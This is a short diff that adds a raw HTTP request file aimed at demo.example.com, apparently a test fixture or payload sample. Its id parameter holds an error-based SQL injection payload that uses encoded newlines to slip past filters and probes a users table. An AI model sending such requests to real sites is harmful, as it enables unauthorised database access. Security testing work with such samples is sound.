@@ -1,0 +1,4 @@
+GET /a?id=1'%0aand%0arow(1,1)>(select%0acount(*),count(*)%0afrom%0ausers)%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
